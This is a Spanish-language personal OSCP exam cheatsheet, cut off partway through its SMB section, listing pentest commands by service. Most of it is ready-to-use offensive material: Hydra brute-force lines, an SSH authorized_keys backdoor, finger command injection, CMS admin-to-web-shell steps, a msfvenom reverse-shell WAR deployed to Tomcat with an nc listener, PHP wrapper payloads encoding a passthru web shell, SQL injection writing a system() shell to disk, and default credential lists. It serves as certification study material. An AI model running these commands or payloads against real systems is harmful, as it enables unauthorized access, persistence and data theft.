I"ﬁ!<p>Bienvenidos a mi Cheatsheet personal para la certificaci√≥n de la OSCP</p>

<h2 id="protocolos">Protocolos</h2>
<h3 id="ftp---21">FTP -&gt; 21</h3>
<p>FTP (File Transfer Protocol) es un protocolo comunmente utilizado para la transferencia de archivos utiliza el puerto 21 para comando y control y el 20 para el transporte de datos</p>

<h4 id="descargar-archivo">Descargar archivo</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>ftp &lt;IP&gt;
PASSIVE             // <span class="o">(</span>OPCIONAL<span class="o">)</span>
BINARY
get &lt;FILE&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="subir-un-archivo">Subir un archivo</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>ftp &lt;IP&gt;
PASSIVE              // <span class="o">(</span>OPCIONAL<span class="o">)</span>
BINARY
put &lt;FILE&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>El comando BINARY es un modo usado comunmente para transferencia de archivos binarios</p>

<h4 id="fuerza-bruta">Fuerza Bruta</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>hydra <span class="nt">-V</span> <span class="nt">-f</span> <span class="nt">-L</span> &lt;USERS_LIST&gt; <span class="nt">-P</span> &lt;PASSWORDS_LIST&gt; ftp://&lt;IP&gt; <span class="nt">-u</span> <span class="nt">-vV</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="ssh---22">SSH -&gt; 22</h3>
<p>SSH (Secure Shell) es un protocolo empleado para el acceso remoto a un servidor mediante una conexi√≥n cifrada, este tambien permite un sistema de keys.</p>

<h4 id="conexi√≥n-basica">Conexi√≥n Basica</h4>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>ssh &lt;USER&gt;@&lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="keys">Keys</h4>
<p>Dentro del directorio personal de cada usuario encontramos el directorio <code class="language-plaintext highlighter-rouge">~/.ssh/</code> si no est√° puede ser creado en SSH dentro podemos encontrar los siguientes contenidos:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td> --><td class="rouge-code"><pre>id_rsa.pub      -&gt; Esta ser√≠a la key publica
id_rsa          -&gt; Y esta ser√≠a la privada

authorized_keys -&gt; Este archivo contiene todas las keys publicas a las que se les 
                   permite el acceso remoto
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="conexi√≥n-id_rsa">Conexi√≥n id_rsa</h4>
<p>Es importante saber que si poseemos de una key privada de algun usuario podr√≠amos emplearla para conectarnos sin contrase√±a de la siguiente forma:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>ssh <span class="nt">-i</span> id_rsa &lt;USER&gt;@&lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<ul>
  <li>(La id_rsa ha de tener privilegios 600 -&gt; <code class="language-plaintext highlighter-rouge">chmod 600 id_rsa</code>)</li>
</ul>

<h4 id="backdoor">Backdoor</h4>
<p>Con <code class="language-plaintext highlighter-rouge">ssh-keygen</code> podemos generar una clave privada y publica de nuestro usuario</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre><span class="o">[</span>+] Nuestra maquina:
	ssh-keygen
	<span class="nb">cat</span> ~/.ssh/id_rsa.pub | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xclip <span class="nt">-sel</span> clip

<span class="o">[</span>+] Maquina victima:
	<span class="nb">echo</span> <span class="s2">"&lt;contenido_id_rsa.pub&gt;"</span> <span class="o">&gt;&gt;</span> ~/.ssh/authorized_keys
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Y ya podriamos conectarnos con nuestra id_rsa privada generada de el comando ssh-keygen</p>

<h4 id="fuerza-bruta-1">Fuerza Bruta</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>hydra <span class="nt">-V</span> <span class="nt">-f</span> <span class="nt">-L</span> &lt;USERS_LIST&gt; <span class="nt">-P</span> &lt;PASSWORDS_LIST&gt; ssh://&lt;IP&gt; <span class="nt">-u</span> <span class="nt">-vV</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="dns---53">DNS -&gt; 53</h3>
<p>Protocolo empleado en la resoluci√≥n de direcciones a IPs</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>dnsenum &lt;DOMAIN&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>dnsrecon <span class="nt">-d</span> &lt;DOMAIN&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="ataque-de-zona-de-transferencia">Ataque de Zona de Transferencia</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>dnsrecon <span class="nt">-d</span> &lt;DOMAIN&gt; <span class="nt">-a</span>
dig axfr &lt;DOMAIN&gt; @ns1.test.com
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="fuerza-bruta-2">Fuerza Bruta</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>https://github.com/blark/aiodnsbrute
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="finger---73">FINGER -&gt; 73</h3>

<h4 id="enumeraci√≥n-de-usuarios">Enumeraci√≥n de Usuarios</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>finger @&lt;IP&gt;
finger &lt;USER&gt;@&lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="ejecuci√≥n-de-comandos">Ejecuci√≥n de comandos</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>finger <span class="s2">"|/bin/id@&lt;IP&gt;"</span>
finger <span class="s2">"|/bin/ls -a /&lt;IP&gt;"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="http--https---80-443">HTTP &amp; HTTPS -&gt; 80, 443</h3>

<h4 id="wordpress">Wordpress</h4>
<p>Wordpress es un gestor de contenido web (CMS) comunmente empleado.</p>
<blockquote>
  <p>El archivo mas importante a enumerar es: <code class="language-plaintext highlighter-rouge">wp-config.php</code> ya que este suele contener la contrase√±a y el usuario empleados para la base de datos de wordpress</p>
</blockquote>

<h5 id="wpscan">WPSCAN</h5>

<p>Herramienta para hacer un scan general de wordpress como encontrar plugins con vulnerabilidades o enumerar usuarios validos en wordpress</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre><span class="c"># Scan</span>
wpscan <span class="nt">--url</span> &lt;URL&gt;

<span class="c"># Enumerar Usuarios(u) y vulnerabilidades de plugins(vp)</span>
wpscan <span class="nt">--url</span> &lt;URL&gt; <span class="nt">--enumerate</span> u,vp

<span class="c"># Detectar plugins de forma mas agresiva (mejor con --api-token)</span>
<span class="nt">--pulings-detection</span> aggressive

<span class="c"># Fuerza bruta a un usuario usando un diccionario</span>
wpscan <span class="nt">--url</span> &lt;URL&gt; <span class="nt">-U</span> <span class="s2">"&lt;USER&gt;"</span> <span class="nt">-P</span> &lt;PASSWORDS.txt&gt;

</pre></td></tr></tbody></table></code></pre></div></div>
<p>(Podemos emplear wpseku como alternativa)</p>

<h5 id="wordpress-a-rce-admin-requerido">Wordpress a RCE (admin requerido)</h5>

<p>Obtener <code class="language-plaintext highlighter-rouge">Ejecuci√≥n remota de comandos</code> (RCE) estando previamente autenticado como admin en wordpress</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>Modificamos el php del tema usado <span class="o">(</span>Credenciales de admin Requeridas<span class="o">)</span>

Appearance -&gt; Editor -&gt; 404 Template <span class="o">(</span>at the right<span class="o">)</span>
Cambiamos el contenido a una php shell

<span class="c"># Aqu√≠ un ejemplo de shell y de como llamarla</span>
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
http://&lt;IP&gt;/wp-content/themes/twentytwelve/404.php
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="drupal">Drupal</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>droopescan scan <span class="nt">-u</span> &lt;URL&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="enumeraci√≥n-de-usuarios-1">Enumeraci√≥n de usuarios</h5>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td> --><td class="rouge-code"><pre>In /user/register just try to create a username and <span class="k">if </span>the name is already taken it will be notified :
<span class="k">*</span>The name admin is already taken<span class="k">*</span>

If you request a new password <span class="k">for </span>an existing username :
<span class="k">*</span>Unable to send e-mail. Contact the site administrator <span class="k">if </span>the problem persists.<span class="k">*</span>

If you request a new password <span class="k">for </span>a non-existent username :
<span class="k">*</span>Sorry, <span class="nb">test </span>is not recognized as a user name or an e-mail address.<span class="k">*</span>

Accessing /user/&lt;number&gt; you can see the number of existing <span class="nb">users</span> :
	- /user/1 -&gt; Access denied <span class="o">(</span>user exist<span class="o">)</span>
	- /user/2 -&gt; Page not found <span class="o">(</span>user doesn<span class="s1">'t exist)
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="enumeraci√≥n-de-paginas-ocultas">Enumeraci√≥n de paginas ocultas</h5>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>Fuzz /node/&lt;NUMBER&gt; where &lt;NUMBER&gt; is a number <span class="o">(</span>from 1 to 500 <span class="k">for </span>example<span class="o">)</span><span class="nb">.</span>
You could find hidden pages <span class="o">(</span><span class="nb">test</span>, dev<span class="o">)</span> which are not referenced by the search engines.

wfuzz <span class="nt">-c</span> <span class="nt">-z</span> range,1-500 <span class="nt">--hc</span> 404 &lt;URL&gt;/node/FUZZ
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="drupal-a-rce">Drupal a RCE</h5>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre>You need the plugin php to be installed <span class="o">(</span>check it accessing to /modules/php and <span class="k">if </span>it returns a 403 <span class="k">then</span>, exists, <span class="k">if </span>not found, <span class="k">then </span>the plugin php isn<span class="s1">'t installed)

Go to Modules -&gt; (Check) PHP Filter  -&gt; Save configuration

https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php

Then click on Add content -&gt; Select Basic Page or Article -&gt; Write php shellcode on the body -&gt; Select PHP code in Text format -&gt; Select Preview
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="joomla">Joomla</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>joomscan <span class="nt">-u</span> &lt;URL&gt;
./joomlavs.rb <span class="nt">--url</span> &lt;URL&gt; <span class="nt">-a</span> <span class="nt">-v</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="tomcat">Tomcat</h4>

<h5 id="credenciales-por-defecto">Credenciales por defecto</h5>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files <span class="o">(</span>execute code<span class="o">)</span><span class="nb">.</span> But  this path is protected by basic HTTP auth, the most common credentials are:

admin:admin
tomcat:tomcat
admin:&lt;NOTHING&gt;
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="fuerza-bruta-3">Fuerza bruta</h5>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>hydra <span class="nt">-L</span> &lt;USERS_LIST&gt; <span class="nt">-P</span> &lt;PASSWORDS_LIST&gt; <span class="nt">-f</span> &lt;IP&gt; http-get /manager/html <span class="nt">-vV</span> <span class="nt">-u</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="tomcat-a-rce">Tomcat a RCE</h5>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td> --><td class="rouge-code"><pre><span class="c"># Generate payload</span>
msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt; <span class="nt">-f</span> war <span class="o">&gt;</span> shell.war

<span class="c"># Upload payload</span>
Tomcat6 :
wget <span class="s1">'http://&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;:8080/manager/deploy?war=file:shell.war&amp;path=/shell'</span> <span class="nt">-O</span> -

Tomcat7 and above :
curl <span class="nt">-v</span> <span class="nt">-u</span> &lt;USER&gt;:&lt;PASSWORD&gt; <span class="nt">-T</span> shell.war <span class="s1">'http://&lt;IP&gt;:8080/manager/text/deploy?path=/shellh&amp;update=true'</span>

<span class="c"># Listener</span>
nc <span class="nt">-lvp</span> &lt;PORT&gt;

<span class="c"># Execute payload</span>
curl http://&lt;IP&gt;:8080/shell/
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="webdav">WebDav</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>davtest <span class="nt">-url</span> &lt;URL&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="spidering--brute-force-directories--files">Spidering / Brute force directories / files</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre>gospider <span class="nt">-d</span> &lt;DEPTHS&gt; <span class="nt">--robots</span> <span class="nt">--sitemap</span> <span class="nt">-t</span> &lt;THREADS&gt; <span class="nt">-s</span> &lt;URL&gt;

ffuf <span class="nt">-w</span> /home/liodeus/directory-list-lowercase-2.3-medium.txt <span class="nt">-u</span> &lt;URL&gt;/FUZZ <span class="nt">-e</span> .php,.txt <span class="nt">-t</span> &lt;THREADS&gt;
dirbuster

Dictionaries :
   - /usr/share/wordlists/dirb/common.txt
   - /usr/share/wordlists/dirb/big.txt
   - /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="file-backups">File backups</h4>

<p>Once you have found all the files, look for backups of all the executable files (‚Äú<em>.php</em>‚Äù, ‚Äú<em>.aspx</em>‚Äú‚Ä¶). Common variations for naming a backup are</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>file.ext~, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="local-file-inclusion--remote-file-inclusion---lfi--rfi">Local File Inclusion / Remote File Inclusion - LFI / RFI</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="wrappers">Wrappers</h4>

<h5 id="wrapper-phpfilter">Wrapper php://filter</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>http://example.com/index.php?page=php://filter/convert.base64-encode/resource=
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="wrapper-expect">Wrapper expect://</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>http://example.com/index.php?page=expect://id
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="wrapper-data">Wrapper data://</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td> --><td class="rouge-code"><pre>echo '&lt;?php phpinfo(); ?&gt;' | base64 -w0 -&gt; PD9waHAgcGhwaW5mbygpOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=

If code execution, you should see phpinfo(), go to the disable_functions and craft a payload with functions which aren't disable.

Code execution with 
	- exec
	- shell_exec
	- system
	- passthru
	- popen

# Exemple
echo '&lt;?php passthru($_GET["cmd"]);echo "Shell done !"; ?&gt;' | base64 -w0 -&gt; PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=

If there is "Shell done !" on the webpage, then there is code execution and you can do things like :

http://example.com/index.php?page=data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo=&amp;cmd=ls
</pre></td></tr></tbody></table></code></pre></div></div>

<h5 id="wrapper-input">Wrapper input://</h5>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>curl -k -v "http://example.com/index.php?page=php://input" --data "&lt;?php echo shell_exec('id'); ?&gt;"
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="command-injection">Command injection</h4>

<ul>
  <li><a href="">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a></li>
</ul>

<h4 id="deserialization">Deserialization</h4>

<ul>
  <li><a href="">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization</a></li>
</ul>

<h4 id="file-upload">File upload</h4>

<ul>
  <li><a href="">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%</a></li>
</ul>

<h4 id="sql-injection">SQL injection</h4>

<ul>
  <li><a href="">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</a></li>
  <li><a href="">https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli</a></li>
</ul>

<p>Si sanitizan el nombre de la tabla o de la base de datos podriamos pasarlo a hexadecimal</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre><span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | xxd <span class="nt">-ps</span> y el output 0x<span class="s2">"</span><span class="nv">$output</span><span class="s2">"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Si es por url hay que usar ‚Äì - o # urlencoded, tambien podemos hacer sqli mediante burpsuite</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre><span class="n">Distintos</span> <span class="n">payloads</span> <span class="n">serian</span><span class="p">:</span>
<span class="n">tom</span><span class="s1">' or '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="s1">'

tom'</span><span class="c1">-- -</span>

<span class="n">tom</span><span class="s1">'#

admin'</span><span class="p">)</span><span class="o">#</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td> --><td class="rouge-code"><pre>ERROR BASED:

$data' 
# si nos muestra un error significa que podriamos injectar querys a sql

$data' union select 1-- -

$data' union select schema_name from information_schema.schemata-- - 
# detectar bases de datos

$data' union select table_name from information_schema.tables where table_schema="$basedatos"-- - 
# enumerar tablas de la base de datos

$data' union select column_name from information_schema.columns where table_schema="$basedatos" and table_name="$tabla"-- -

$data' union select group_concat($columna1,0x3a,$columna2) from $tabla-- - 
# en este caso solo se usa 1 campo para 2 columnas

# si $tabla est√° en otra base de datos: $basedatos.$tabla

$data' union select "algo" into outfile "/var/www/html/prueba.txt"-- - 
# probamos a acceder a ip/prueba.txt

$data' union select "&lt;?php system($_REQUEST['cmd']); ?&gt;" into outfile "/var/www/html/prueba.php"-- - 
# para ver si podemos escribir en un fichero
# a lo mejor pudiendo subir codigo php para que lo interprete

' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
# para ver las sentencias que podemos hacer

LOAD_FILE('alsdjfl'); 
# podemos listar contenido de la web para ver como
# funciona el php y incluso sacar psswd y user de db
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="xss">XSS</h4>

<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</a></li>
</ul>

<h4 id="otras-vulnerabilidades-web">Otras vulnerabilidades web</h4>

<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li>
</ul>

<hr />

<h3 id="kerberos---88">Kerberos -&gt; 88</h3>

<ul>
  <li><a href="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/">https://www.tarlogic.com/en/blog/how-to-attack-kerberos/</a></li>
</ul>

<hr />

<h3 id="pop3---110">POP3 -&gt; 110</h3>

<h4 id="fuerza-bruta-4">Fuerza bruta</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre>hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; pop3 -V
hydra -S -v -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -s 995 -f &lt;IP&gt; pop3 -V
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="leer-un-correo">Leer un correo</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre>telnet &lt;IP&gt; 110

USER &lt;USER&gt;
PASS &lt;PASSWORD&gt;
LIST
RETR &lt;MAIL_NUMBER&gt;
QUIT
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="ntp---123udp">NTP -&gt; 123/udp</h3>

<p><code class="language-plaintext highlighter-rouge">NTP (Network Time Protocol)</code> es un protocolo de Internet para sincronizar los relojes de los sistemas inform√°ticos</p>

<p>Existen distintas herramientas para conectarte con ntp y sincronizar tu hora</p>

<hr />

<h3 id="snmp---161udp">SNMP -&gt; 161/udp</h3>

<h4 id="fuerza-bruta-de-la-community-string">Fuerza bruta de la community string</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>onesixtyone -c /home/liodeus/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>snmpbulkwalk -c &lt;COMMUNITY_STRING&gt; -v&lt;VERSION&gt; &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>snmp-check &lt;IP&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="modifying-snmp-values">Modifying SNMP values</h4>

<ul>
  <li><a href="">http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html</a></li>
</ul>

<hr />

<h3 id="ldap---389">LDAP -&gt; 389</h3>

<h4 id="scans">Scans</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td> --><td class="rouge-code"><pre>nmap -n -sV --script "ldap* and not brute"

ldapsearch -h &lt;IP&gt; -x -s base
ldapsearch -h &lt;IP&gt; -x -D '&lt;DOMAIN&gt;\&lt;USER&gt;' -w '&lt;PASSWORD&gt;' -b "DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="interfaz-grafica">Interfaz Grafica</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>jxplorer
</pre></td></tr></tbody></table></code></pre></div></div>

<hr />

<h3 id="smb---445">SMB -&gt; 445</h3>

<h4 id="version-if-nmap-didnt-detect-it">Version if nmap didn‚Äôt detect it</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
